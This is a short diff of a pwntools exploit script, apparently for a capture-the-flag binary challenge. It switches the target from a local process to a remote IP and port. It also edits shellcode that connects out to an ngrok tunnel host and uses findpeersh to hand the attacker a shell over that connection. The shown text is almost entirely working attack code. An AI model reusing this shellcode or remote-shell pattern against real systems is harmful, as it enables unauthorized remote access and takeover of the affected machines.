@@ -8,7 +8,8 @@ libc = ELF('./libc-2.31.so')
 
 context.binary = e
 
-p = process(e.path)
+#p = process(e.path)
+p = remote('143.198.127.103', 42009)
 
 #funcs
 
@@ -52,8 +53,8 @@ arena_off = 0x1bebe0
 mprotect_off = libc.sym['mprotect']
 
 shellcode = shellcraft.open('/dev/pts/0')
-shellcode += shellcraft.connect('4.tcp.ngrok.io', 13964)
-shellcode += shellcraft.findpeersh(13964)
+shellcode += shellcraft.connect('8.tcp.ngrok.io', 12364)
+shellcode += shellcraft.findpeersh(12364)
 
 log.info('Csu adr: ' + hex(csu))
 log.info('Dtor adr: ' + hex(dtor))
